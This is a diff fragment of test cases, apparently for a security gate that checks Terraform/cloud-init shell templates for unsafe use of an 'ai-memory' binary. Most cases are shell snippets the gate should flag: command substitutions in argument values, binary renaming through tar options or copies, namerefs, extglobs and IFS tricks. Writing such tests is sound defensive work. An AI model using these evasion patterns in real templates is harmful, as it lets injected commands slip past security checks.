+        ("ai-memory subcommand in a variable after --, listed (#4837 R7)", [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory -- "$V" --host 0.0.0.0\n' + dec)]),
+        ("ai-memory --db=$X unquoted (word split), listed (#4837 R8)", [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db=$X --host 0.0.0.0\n' + dec)]),
+        ("ai-memory --db $X unquoted (word split), listed (#4837 R8)", [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db $X --host 0.0.0.0\n' + dec)]),
+        ("ai-memory --db=$(cmd) substitution, listed (#4837 R8)", [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db=$(cat /f) --host 0.0.0.0\n' + dec)]),
+        ("ai-memory unquoted expansion in a --db= value, listed (#4837 R8)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db=$V --host 0.0.0.0\n" + dec)]),
+        ("ai-memory unquoted command substitution mixed into a --db= value, listed (#4837 R8)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db=/x$(cat /f) --host 0.0.0.0\n" + dec)]),
+        ("ai-memory literal mixed with an unquoted variable in a --db= value, listed (#4837 R8)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db=/x$V --host 0.0.0.0\n" + dec)]),
+        ("ai-memory unquoted --agent-id= value, listed (#4837 R8)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --agent-id=$V --host 0.0.0.0\n" + dec)]),
+        ("ai-memory unquoted expansion as a separate --db value, listed (#4837 R8)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db $V --host 0.0.0.0\n" + dec)]),
+        ("ai-memory unquoted interpolation in a --db= value, listed (#4837 R10)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db=${X} stats\n" + dec)]),
+        ("ai-memory unquoted interpolation as a separate --db value, listed (#4837 R10)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db ${X} stats\n" + dec)]),
+        ("ai-memory unquoted interpolation in an --agent-id= value, listed (#4837 R10)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --agent-id=${X} stats\n" + dec)]),
+        ("ai-memory unquoted interpolation as a separate --agent-id value, listed (#4837 R10)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --agent-id ${X} stats\n" + dec)]),
+        ("ai-memory unquoted interpolation in a --db-passphrase-file= value, listed (#4837 R10)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db-passphrase-file=${X} stats\n" + dec)]),
+        ("ai-memory unquoted interpolation as a separate --db-passphrase-file value, listed (#4837 R10)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db-passphrase-file ${X} stats\n" + dec)]),
+        ("ai-memory literal mixed with an unquoted interpolation in a --db= value, listed (#4837 R10)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db=/x${X} stats\n" + dec)]),
+        ("ai-memory literal mixed with an unquoted interpolation as a separate --db value, listed (#4837 R10)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db /x${X} stats\n" + dec)]),
+        ("ai-memory literal mixed with an unquoted interpolation in an --agent-id= value, listed (#4837 R10)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --agent-id=a${X}b stats\n" + dec)]),
+        ("ai-memory \"${X}\" quoted terraform value, listed (#4837 R11)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db \"${X}\" stats\n" + dec)]),
+        ("ai-memory --db=\"${X}\" quoted terraform value, listed (#4837 R11)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db=\"${X}\" stats\n" + dec)]),
+        ("ai-memory --agent-id \"/x/${X}\" quoted terraform value, listed (#4837 R11)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --agent-id \"/x/${X}\" stats\n" + dec)]),
+        ("ai-memory \"$${A[@]}\" array value, listed (#4837 R11)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db \"$${A[@]}\" --host 0.0.0.0\n" + dec)]),
+        ("ai-memory --db=\"$${A[@]}\" array value, listed (#4837 R11)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db=\"$${A[@]}\" --host 0.0.0.0\n" + dec)]),
+        ("ai-memory \"$${A[@]:0}\" array slice value, listed (#4837 R11)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --agent-id \"$${A[@]:0}\" --host 0.0.0.0\n" + dec)]),
+        ("ai-memory brace expansion in a separate --db value, listed (#4837 R11)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db {/x,s}erve --host 0.0.0.0\n" + dec)]),
+        ("ai-memory glob in a separate --db value, listed (#4837 R11)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db /var/lib/ai-memory/* --host 0.0.0.0\n" + dec)]),
+        ("ai-memory brace expansion in the subcommand, listed (#4837 R11)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db /x {s,x}erve --host 0.0.0.0\n" + dec)]),
+        ("ai-memory directive-conditional quotes on a --db value, listed (#4837 R11)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db %{ if c }\"%{ endif }$X%{ if c }\"%{ endif } --host 0.0.0.0\n" + dec)]),
+        ("ai-memory for-loop directive repeats a --db value, listed (#4837 R11)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db \"%{ for s in l }${s}\" \"%{ endfor }\" --host 0.0.0.0\n" + dec)]),
+        # #4837 R12 (round 10). A terraform value inside double quotes was green in d949c732c;
+        # terraform pastes the value into the script text before bash parses it, so a value
+        # holding a quote, $( or a backtick is code. The closed grammar makes all 7 red.
+        ('ai-memory --db="${X}/y" quoted terraform value, listed (#4837 R12 R1)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db="${X}/y" stats\n' + dec)]),
+        ('ai-memory --db "/x/${X}" quoted terraform value, listed (#4837 R12 R1)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db "/x/${X}" stats\n' + dec)]),
+        ('ai-memory --agent-id="${X}" quoted terraform value, listed (#4837 R12 R1)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --agent-id="${X}" stats\n' + dec)]),
+        ('ai-memory --agent-id "${X}" quoted terraform value, listed (#4837 R12 R1)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --agent-id "${X}" stats\n' + dec)]),
+        ('ai-memory --db-passphrase-file="${X}" quoted terraform value, listed (#4837 R12 R1)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db-passphrase-file="${X}" stats\n' + dec)]),
+        ('ai-memory "$${DB:-/x}" parameter operator, listed (#4837 R12 R1)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db "$${DB:-/x}" stats\n' + dec)]),
+        ('ai-memory "$${A[*]}" array, listed (#4837 R12 R1)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db "$${A[*]}" stats\n' + dec)]),
+        ('ai-memory "$${X:-a b}" operator with a space, listed (#4837 R12 R1)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db "$${X:-a b}" stats\n' + dec)]),
+        ('ai-memory quoted glob characters "/x/*", listed (#4837 R12 R1)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db "/x/*" stats\n' + dec)]),
+        ('ai-memory single-quoted glob and brace characters, listed (#4837 R12 R1)', [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db '/x/*{a,b}' stats\n" + dec)]),
+        ('ai-memory tilde value, listed (#4837 R12 R1)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db ~/x stats\n' + dec)]),
+        ('ai-memory quoted variable followed by an unquoted one, listed (#4837 R12 R1)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db="$${X}"$${Y} stats\n' + dec)]),
+        ('ai-memory empty --db= value, listed (#4837 R12 R1)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db= stats\n' + dec)]),
+        ('ai-memory unknown --flag= value with an expansion, listed (#4837 R12 R1)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --json=$${X} stats\n' + dec)]),
+        ('ai-memory quoted array expansion as a separate --db value, listed (#4837 R9, #4966)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db "$${A[@]}" --host 0.0.0.0\n' + dec)]),
+        ('ai-memory quoted array expansion in a --db= value, listed (#4837 R9, #4966)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db="$${A[@]}" --host 0.0.0.0\n' + dec)]),
+        ('ai-memory glob as a separate --db value, listed (#4837 R9, #4967)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db /etc/* --host 0.0.0.0\n' + dec)]),
+        ('ai-memory brace expansion as a separate --db value, listed (#4837 R9, #4967)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db {/x,stats} --host 0.0.0.0\n' + dec)]),
+        ('ai-memory quoted subcommand, listed (#4837 R12 R2)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db /x "stats"\n' + dec)]),
+        ('ai-memory subcommand after -- is quoted, listed (#4837 R12 R2)', [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory -- 'stats'\n" + dec)]),
+        ('ai-memory subcommand mixed with a variable, listed (#4837 R12 R2)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db /x st$${Y}\n' + dec)]),
+        ('ai-memory standalone directive before the subcommand, listed (#4837 R12 R2)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db /x %{ if c } stats\n' + dec)]),
+        ('reserved TFVALUE in a heredoc body, listed (#4837 R9, #4968)', [(dec, "      cat > /etc/x.sh <<'EOF'\n      $${TFVALUE} --host 0.0.0.0\n      EOF\n" + dec)]),
+        ('shell TFVALUE as a command in a data heredoc, listed (#4837 R12 R3)', [(dec, "      cat > /etc/ai-memory/x.conf <<'EOF'\n      $${TFVALUE} --db /x stats\n      EOF\n" + dec)]),
+        ('control character in the template, listed (#4837 R12 R3)', [(dec, '      echo a\x03b\n' + dec)]),
+        ('ai-memory behind taskset, listed (#4837 R12 R4)', [(dec, '      taskset -c 0 /usr/local/lib/ai-memory/bin/ai-memory --db $${X} stats\n' + dec)]),
+        ('ai-memory behind doas, listed (#4837 R12 R4)', [(dec, '      doas -u aimemory /usr/local/lib/ai-memory/bin/ai-memory --db $${X} stats\n' + dec)]),
+        ('ai-memory behind time -p, listed (#4837 R12 R4)', [(dec, '      time -p /usr/local/lib/ai-memory/bin/ai-memory --db $${X} stats\n' + dec)]),
+        ('ai-memory behind unshare, listed (#4837 R12 R4)', [(dec, '      unshare -m /usr/local/lib/ai-memory/bin/ai-memory --db $${X} stats\n' + dec)]),
+        ('ai-memory behind prlimit, listed (#4837 R12 R4)', [(dec, '      prlimit --nofile=1024 /usr/local/lib/ai-memory/bin/ai-memory --db $${X} stats\n' + dec)]),
+        ('ai-memory behind numactl, listed (#4837 R12 R4)', [(dec, '      numactl -N 0 /usr/local/lib/ai-memory/bin/ai-memory --db $${X} stats\n' + dec)]),
+        ('ai-memory behind setpriv, listed (#4837 R12 R4)', [(dec, '      setpriv --reuid=aimemory /usr/local/lib/ai-memory/bin/ai-memory --db $${X} stats\n' + dec)]),
+        ('ai-memory behind runuser without --, listed (#4837 R12 R4)', [(dec, '      runuser aimemory /usr/local/lib/ai-memory/bin/ai-memory --db $${X} stats\n' + dec)]),
+        ('ai-memory at a data-home parent behind taskset, listed (#4837 R12 R4, #5092)', [(dec, '      taskset -c 0 /opt/ai-memory --db $${X} stats\n' + dec)]),
+        ('ai-memory at a data home copied to another name, listed (#4837 R12 R4, #5092)', [(dec, '      cp /etc/ai-memory /usr/local/bin/aim\n' + dec)]),
+        ('ai-memory copied by a glob source to another name, listed (#4837 R12 R4, #5093)', [(dec, '      cp /usr/local/lib/ai-memory/bin/ai-mem* /usr/local/bin/aim\n' + dec)]),
+        ('ai-memory installed by a ? glob source to another name, listed (#4837 R12 R4, #5093)', [(dec, '      install -m 0755 /usr/local/lib/ai-memory/bin/ai-memor? /usr/local/bin/aim\n' + dec)]),
+        ('ai-memory copied with a brace operand, listed (#4837 R12 R4, #5093)', [(dec, '      cp /usr/local/lib/ai-memory/bin/ai-memory{,.real}\n' + dec)]),
+        ('ai-memory copied by a brace that holds both paths, listed (#4837 R12 R4, #5093)', [(dec, '      cp {/usr/local/lib/ai-memory/bin/ai-memory,/usr/local/bin/aim}\n' + dec)]),
+        ('ai-memory named by a glob behind taskset, listed (#4837 R12 R4, #5093)', [(dec, '      taskset -c 0 /usr/local/lib/ai-memory/bin/ai-mem* --db /x stats\n' + dec)]),
+        ('ai-memory named by a brace behind taskset, listed (#4837 R12 R4, #5093)', [(dec, '      taskset -c 0 /usr/local/lib/ai-memory/bin/ai-{memory,x} --db /x stats\n' + dec)]),
+        ('ai-memory named by a brace past 64 alternatives behind taskset, listed (#4837 R12 R4 pin, #5205)', [(dec, '      taskset -c 0 /usr/local/lib/ai-memory/bin/{' + ','.join('a%d' % i for i in range(65)) + ',x} --db /x stats\n' + dec)]),
+        ('tar --transform with no binary name in sight, listed (#4837 R12 R4, #5093)', [(dec, '      tar -C /usr/local/bin -xf /root/b.tar --transform s/x/aim/\n' + dec)]),
+        ('tar options from a TAR_OPTIONS prefix, listed (#4837 R12 R4, #5093 R11)', [(dec, '      TAR_OPTIONS=--transform=s/x/aim/ tar -C /usr/local/bin -xf /root/b.tar\n' + dec)]),
+        ('tar options from an exported TAR_OPTIONS, listed (#4837 R12 R4, #5093 R11)', [(dec, '      export TAR_OPTIONS=--xform=s/x/aim/\n      tar -C /usr/local/bin -xf /root/b.tar\n' + dec)]),
+        ('tar options from a quote-split exported TAR_OPTIONS, listed (#4837 R12 R4, #5093 R11)', [(dec, '      export TAR_""OPTIONS=--xform=s/x/aim/\n      tar -C /usr/local/bin -xf /root/b.tar\n' + dec)]),
+        ('tar options from an export whose name is built from an expansion, listed (#4837 R12 R4, #5326)', [(dec, '      N=TAR_OPT; export "$${N}IONS=--xform=s/x/aim/"; tar -C /usr/local/bin -xf /root/b.tar\n' + dec)]),
+        ('tar options from a declare -x whose name is built from an expansion, listed (#4837 R12 R4, #5326)', [(dec, '      T=OPTIONS; declare -x "TAR_$T=--xform=s/x/aim/"; tar -C /usr/local/bin -xf /root/b.tar\n' + dec)]),
+        ('tar options from a local -x whose name is built from an expansion, listed (#4837 R12 R4, #5326)', [(dec, '      f() { local -x "$${N}IONS=--xform=s/x/aim/"; tar -C /usr/local/bin -xf /root/b.tar; }; N=TAR_OPT; f\n' + dec)]),
+        ('tar options from a readonly name built from an expansion, then exported, listed (#4837 R12 R4, #5326)', [(dec, '      N=TAR_OPT; readonly "$${N}IONS=--xform"; export "$${N}IONS"; tar -C /usr/local/bin -xf /root/b.tar\n' + dec)]),
+        ('tar options from printf -v into a name built from an expansion, listed (#4837 R12 R4, #5326)', [(dec, '      N=TAR_OPT; set -a; printf -v "$${N}IONS" %s --xform=s/x/aim/; tar -C /usr/local/bin -xf /root/b.tar\n' + dec)]),
+        ('tar options from read into a name built from an expansion, listed (#4837 R12 R4, #5326)', [(dec, '      N=TAR_OPT; set -a; read -r "$${N}IONS" <<< --xform=s/x/aim/; tar -C /usr/local/bin -xf /root/b.tar\n' + dec)]),
+        ('tar options from mapfile into a name built from an expansion, listed (#4837 R12 R4, #5326)', [(dec, '      N=TAR_OPT; set -a; mapfile -t "$${N}IONS" < /dev/null; tar -C /usr/local/bin -xf /root/b.tar\n' + dec)]),
+        ('tar options from getopts into a name built from an expansion, listed (#4837 R12 R4, #5326)', [(dec, '      N=TAR_OPT; set -a; getopts x "$${N}IONS"; tar -C /usr/local/bin -xf /root/b.tar\n' + dec)]),
+        ('nameref whose target is built from an expansion, alone, listed (#4837 R12 R4, #5326)', [(dec, '      T=X; declare -n R="$T"\n' + dec)]),
+        ('binary assigned as a one-element array, then run behind taskset, listed (#4837 R12 R4, #5330)', [(dec, "      A=(/usr/local/lib/ai-memory/bin/ai-memory); taskset -c 0 \"$A\" --db /x stats\n" + dec)]),
+        ('binary written through a nameref whose target is built from an expansion, the store-url data line made plain so that no other rule reddens the template, listed (#4837 R12 R4, #5330)', [(DSNFILE, "postgres-url"), (dec, "      T=A; A=/usr/bin/true; declare -n R=\"$T\"; R=/usr/local/lib/ai-memory/bin/ai-memory; taskset -c 0 \"$A\" --db /x stats\n" + dec)]),
+        ('binary written through a nameref whose target is assigned from an expansion, the store-url data line made plain so that no other rule reddens the template, listed (#4837 R12 R4, #5330)', [(DSNFILE, "postgres-url"), (dec, "      T=A; A=/usr/bin/true; declare -n R; R=$T; R=/usr/local/lib/ai-memory/bin/ai-memory; taskset -c 0 \"$A\" --db /x stats\n" + dec)]),
+        ('tar abbreviated --transf option, listed (#4837 R12 R4, #5093)', [(dec, '      tar -C /usr/local/bin -xf /root/b.tar --transf=s/x/aim/\n' + dec)]),
+        ('tar shortest unambiguous --tr option, listed (#4837 R12 R4 pin, #5205)', [(dec, '      tar -C /usr/local/bin -xf /root/b.tar --tr=s/x/aim/\n' + dec)]),
+        ('tar s (rename pattern) in a short cluster, listed (#4837 R12 R4 pin, #5205)', [(dec, '      tar -xsf /root/b.tar -C /usr/local/bin\n' + dec)]),
+        ('tar rename option spelled with quotes inside, listed (#4837 R12 R4, #5328)', [(dec, '      tar -C /usr/local/bin -xf /root/b.tar --"tra"nsform=s/x/aim/\n' + dec)]),
+        ('tar rename option quoted as a whole, listed (#4837 R12 R4, #5328)', [(dec, "      tar -C /usr/local/bin -xf /root/b.tar '--transform=s/x/aim/'\n" + dec)]),
+        ('tar long option whose name is an expansion, listed (#4837 R12 R4, #5328)', [(dec, '      tar -C /usr/local/bin -xf /root/b.tar --$${X}\n' + dec)]),
+        ('tar short cluster holding an expansion, listed (#4837 R12 R4, #5328)', [(dec, '      tar -C /usr/local/bin -x$${F}f /root/b.tar\n' + dec)]),
+        ('tar operand that expands to a rename option, listed (#4837 R12 R4, #5328)', [(dec, '      O=--transform=s/x/aim/; tar -C /usr/local/bin -xf /root/b.tar $O\n' + dec)]),
+        ('tar --rename option, listed (#4837 R12 R4, #5093)', [(dec, '      tar -C /usr/local/bin -xf /root/b.tar --rename=s/x/aim/\n' + dec)]),
+        ('tar program option in a short cluster, listed (#4837 R12 R4, #5093)', [(dec, '      tar -xvIsh -f /x.tar\n' + dec)]),
+        ('tar program option in the dashless first argument, listed (#4837 R12 R4, #5093)', [(dec, '      tar xIf gzip /x.tar\n' + dec)]),
+        ('tar abbreviated --to-com option, listed (#4837 R12 R4, #5093)', [(dec, '      tar -xf /x.tar --to-com=/usr/local/bin/x\n' + dec)]),
+        ('find -exec copies its match, listed (#4837 R12 R4, #5093)', [(dec, '      find /usr/local/lib -type f -exec cp {} /usr/local/bin/aim \\;\n' + dec)]),
+        ('cp under xargs, listed (#4837 R12 R4, #5093)', [(dec, '      ls /usr/local/lib/ai-memory/bin | xargs -I{} cp {} /usr/local/bin/aim\n' + dec)]),
+        ('ai-memory found by command -v behind taskset, listed (#4837 R12 R4, #5094)', [(dec, '      B=$(command -v ai-memory); taskset -c 0 "$${B}" --db /x stats\n' + dec)]),
+        ('ai-memory through a variable alias behind taskset, listed (#4837 R12 R4, #5094)', [(dec, '      B=/usr/local/lib/ai-memory/bin/ai-memory; C="$${B}"; taskset -c 0 "$${C}" --db /x stats\n' + dec)]),
+        ('ai-memory through a variable operator behind taskset, listed (#4837 R12 R4, #5094)', [(dec, '      B=/usr/local/lib/ai-memory/bin/ai-memory; taskset -c 0 "$${B%.x}" --db /x stats\n' + dec)]),
+        ('ai-memory copied through a variable operator, listed (#4837 R12 R4 pin, #5205)', [(dec, '      B=/usr/local/lib/ai-memory/bin/ai-memory; cp "$${B%x}" /usr/local/bin/aim\n' + dec)]),
+        ('ai-memory through a default operator behind taskset, listed (#4837 R12 R4, #5094)', [(dec, '      taskset -c 0 $${AIM:-/usr/local/lib/ai-memory/bin/ai-memory} --db /x stats\n' + dec)]),
+        ('ai-memory named by a partial expansion behind taskset, listed (#4837 R12 R4, #5094)', [(dec, '      taskset -c 0 /usr/local/lib/ai-memory/bin/$${N} --db /x stats\n' + dec)]),
+        ('ai-memory through a for-loop variable behind taskset, listed (#4837 R12 R4, #5094)', [(dec, '      for f in /usr/local/lib/ai-memory/bin/*; do taskset -c 0 "$f" --db /x stats; done\n' + dec)]),
+        ('read variable run behind taskset, listed (#4837 R12 R4, #5094)', [(dec, '      read X < /etc/x; taskset -c 0 "$${X}" --db /x stats\n' + dec)]),
+        ('substitution run behind taskset, listed (#4837 R12 R4, #5094)', [(dec, '      taskset -c 0 "$(cat /etc/x)" --db /x stats\n' + dec)]),
+        ('indirect expansion run behind taskset, listed (#4837 R12 R4, #5094 R11)', [(dec, '      B=/usr/local/lib/ai-memory/bin/ai-memory; N=B; taskset -c 0 "$${!N}" --db /x stats\n' + dec)]),
+        ('nameref run behind taskset, listed (#4837 R12 R4, #5094 R11)', [(dec, '      B=/usr/local/lib/ai-memory/bin/ai-memory; declare -n R=B; taskset -c 0 "$R" --db /x stats\n' + dec)]),
+        ('array element run behind taskset, listed (#4837 R12 R4, #5094 R11)', [(dec, '      A=(/usr/local/lib/ai-memory/bin/ai-memory); taskset -c 0 "$${A[0]}" --db /x stats\n' + dec)]),
+        ('append-built name run behind taskset, listed (#4837 R12 R4, #5094 R11)', [(dec, '      C=/usr/local/lib/ai-memory/bin/ai-; C+=memory; taskset -c 0 "$C" --db /x stats\n' + dec)]),
+        ('glob value run unquoted behind taskset, listed (#4837 R12 R4, #5094 R11)', [(dec, '      C="/usr/local/lib/ai-memory/bin/ai-mem*"; taskset -c 0 $C --db /x stats\n' + dec)]),
+        ('unassigned variable run behind taskset, listed (#4837 R12 R4, #5094)', [(dec, '      taskset -c 0 "$${UNSET}" --db /x stats\n' + dec)]),
+        ('resolved name through a default operator behind taskset, listed (#4837 R12 R4, #5173)', [(dec, '      A=; taskset -c 0 "$${A:-/usr/local/lib/ai-memory/bin/ai-memory}" --db /x stats\n' + dec)]),
+        ('resolved name through a pattern operator behind taskset, listed (#4837 R12 R4, #5173)', [(dec, '      A=/usr/local/lib/ai-memory/bin/ai-memorx; taskset -c 0 "$${A/x/y}" --db /x stats\n' + dec)]),
+        ('resolved name through a case operator behind taskset, listed (#4837 R12 R4, #5173)', [(dec, '      A=/usr/local/lib/ai-memory/bin/AI-MEMORY; taskset -c 0 "$${A,,}" --db /x stats\n' + dec)]),
+        ('nameref declared before its target behind taskset, listed (#4837 R12 R4, #5174)', [(dec, '      declare -n R=A; A=/usr/local/lib/ai-memory/bin/ai-memory; taskset -c 0 "$R" --db /x stats\n' + dec)]),
+        ('target written through a nameref behind taskset, listed (#4837 R12 R4, #5174)', [(dec, '      A=/usr/bin/true; declare -n R; R=A; R=/usr/local/lib/ai-memory/bin/ai-memory; taskset -c 0 "$A" --db /x stats\n' + dec)]),
+        ('nameref whose target is an expansion behind taskset, listed (#4837 R12 R4, #5174)', [(dec, '      T=A; A=/usr/local/lib/ai-memory/bin/ai-memory; declare -n R="$T"; taskset -c 0 "$R" --db /x stats\n' + dec)]),
+        ('nameref declared by a quoted builtin name behind taskset, listed (#4837 R12 R4, #5323)', [(dec, '      "declare" -n R=A; A=/usr/local/lib/ai-memory/bin/ai-memory; taskset -c 0 "$R" --db /x stats\n' + dec)]),
+        ('nameref declared by an escaped builtin name behind taskset, listed (#4837 R12 R4, #5323)', [(dec, '      d\\eclare -n R=A; A=/usr/local/lib/ai-memory/bin/ai-memory; taskset -c 0 "$R" --db /x stats\n' + dec)]),
+        ('nameref declared with a quoted -n behind taskset, listed (#4837 R12 R4, #5323)', [(dec, '      typeset \'-n\' R=A; A=/usr/local/lib/ai-memory/bin/ai-memory; taskset -c 0 "$R" --db /x stats\n' + dec)]),
+        ('nameref declared with an escaped -n in a function behind taskset, listed (#4837 R12 R4, #5323)', [(dec, '      f() { local \\-n R=A; A=/usr/local/lib/ai-memory/bin/ai-memory; taskset -c 0 "$R" --db /x stats; }; f\n' + dec)]),
+        ('nameref declared by an expanded option behind taskset, listed (#4837 R12 R4, #5323)', [(dec, '      F=n; declare -$F R=A; A=/usr/local/lib/ai-memory/bin/ai-memory; taskset -c 0 "$R" --db /x stats\n' + dec)]),
+        ('second name of a declare -n written behind taskset, listed (#4837 R12 R4, #5324)', [(dec, '      B=/usr/bin/true; declare -n R=A S; S=B; S=/usr/local/lib/ai-memory/bin/ai-memory; taskset -c 0 "$B" --db /x stats\n' + dec)]),
+        ('wrapper and ai-memory in one blank-split value behind taskset, listed (#4837 R12 R4, #5327)', [(dec, '      A="/usr/bin/env /usr/local/lib/ai-memory/bin/ai-memory"; taskset -c 0 $A --db /x stats\n' + dec)]),
+        ('glob after a blank in one value behind taskset, listed (#4837 R12 R4, #5327)', [(dec, '      C="-c 0 /usr/local/lib/ai-memory/bin/ai-mem*"; taskset $C --db /x stats\n' + dec)]),
+        ('value split by a literal IFS character behind taskset, listed (#4837 R12 R4, #5327)', [(dec, '      IFS=:; A=/usr/bin/true:/x; taskset -c 0 $A --db /x stats\n' + dec)]),
+        ('IFS set to a value the gate cannot read, then a value behind taskset, listed (#4837 R12 R4, #5327)', [(dec, '      IFS=$(printf :); A=/usr/bin/true:/x; taskset -c 0 $A --db /x stats\n' + dec)]),
+        ('ai-memory through a variable behind taskset, listed (#4837 R12 R4)', [(dec, '      AIM=/usr/local/lib/ai-memory/bin/ai-memory; taskset -c 0 "$${AIM}" --db $${X} stats\n' + dec)]),
+        ('shell run by an unknown wrapper, listed (#4837 R12 R4)', [(dec, "      taskset -c 0 sh -c '/usr/local/lib/ai-memory/bin/ai-memory --db $${X} stats'\n" + dec)]),
+        ('ai-memory copied to another name with cp, listed (#4837 R12 R4)', [(dec, '      cp /usr/local/lib/ai-memory/bin/ai-memory /usr/local/bin/aim\n' + dec)]),
+        ('ai-memory linked to another name with ln -s, listed (#4837 R12 R4)', [(dec, '      ln -s /usr/local/lib/ai-memory/bin/ai-memory /usr/local/bin/aim\n' + dec)]),
+        ('ai-memory installed under another name, listed (#4837 R12 R4)', [(dec, '      install -m 0755 /usr/local/lib/ai-memory/bin/ai-memory /usr/local/bin/aim\n' + dec)]),
+        ('ai-memory moved to another name through a variable, listed (#4837 R12 R4)', [(dec, '      AIM=/usr/local/lib/ai-memory/bin/ai-memory; mv "$${AIM}" /usr/local/bin/aim\n' + dec)]),
+        ('no-shebang write_files file run by bash from the script, listed (#4837 R12 R5)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      bash /etc/ai-memory/run.conf\n" + dec)]),
+        ('data-home file run through an extglob, listed (#4837 R12 R5, #5095 R11)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      shopt -s extglob; bash /etc/ai-memory/@(run).conf\n" + dec)]),
+        ('ai-memory named by an extglob, listed (#4837 R12 R4, #5095 R11)', [(dec, "      shopt -s extglob; /usr/local/lib/ai-memory/bin/ai-@(memory) --db /x stats\n" + dec)]),
+        ('ai-memory copied by a bare !() extglob argument, listed (#4837 R12 R4, #5325)', [(dec, '      shopt -s extglob; cd /usr/local/lib/ai-memory/bin; cp !(x) /usr/local/bin/aim\n' + dec)]),
+        ('ai-memory run by a !() extglob at command position, listed (#4837 R12 R4, #5325)', [(dec, '      shopt -s extglob; cd /usr/local/lib/ai-memory/bin; !(x) --db /x stats\n' + dec)]),
+        ('ai-memory run by a !() extglob after if, listed (#4837 R12 R4, #5325)', [(dec, '      shopt -s extglob; cd /usr/local/lib/ai-memory/bin; if !(x) --db /x stats; then :; fi\n' + dec)]),
+        ('data-home file run through a doubled slash, listed (#4837 R12 R5, #5095)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      bash /etc//ai-memory/run.conf\n" + dec)]),
+        ('data-home file run through a ./ segment, listed (#4837 R12 R5, #5095)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      bash /etc/ai-memory/./run.conf\n" + dec)]),
+        ('data-home file run through a ../ segment, listed (#4837 R12 R5, #5095)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      bash /etc/ai-memory/../ai-memory/run.conf\n" + dec)]),
+        ('data-home file run through a brace, listed (#4837 R12 R5, #5095)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      bash /etc/ai-memory/run.con{f,x}\n" + dec)]),
+        ('data-home file run by a relative name, listed (#4837 R12 R5, #5095)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      bash etc/ai-memory/run.conf\n" + dec)]),
+        ('data-home file run through a parameter operator, listed (#4837 R12 R5, #5095)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      D=/etc/ai-memory/\n      bash \"$${D%/}/run.conf\"\n" + dec)]),
+        ('data-home file run through a directory from a substitution, listed (#4837 R12 R5, #5095)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      D=$(echo /etc/ai-memory); bash \"$${D}/run.conf\"\n" + dec)]),
+        ('data-home file run by a loop variable, listed (#4837 R12 R5, #5095)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      for f in /etc/ai-memory/run; do bash \"$f.conf\"; done\n" + dec)]),
+        ('data-home file run by words piped to xargs, listed (#4837 R12 R5, #5095)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      printf %s /etc/ai-memory/run.conf | xargs taskset -c 0\n" + dec)]),
